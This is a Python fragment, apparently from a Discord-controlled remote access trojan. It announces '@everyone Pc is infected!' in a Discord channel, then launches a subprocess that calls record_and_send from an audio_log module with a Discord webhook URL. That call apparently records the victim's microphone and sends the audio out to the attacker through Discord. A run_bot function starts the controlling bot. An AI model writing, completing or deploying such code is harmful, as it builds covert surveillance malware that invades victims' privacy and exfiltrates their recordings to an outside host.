    webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
    message_content = "@everyone Pc is infected!"
    await existing_channel.send(message_content)
    subprocess.Popen(["python", "-c", f"from audio_log import *; record_and_send('{webhook_url}')"])

def run_bot():
    bot_token = token9900
    bot.run(bot_token)
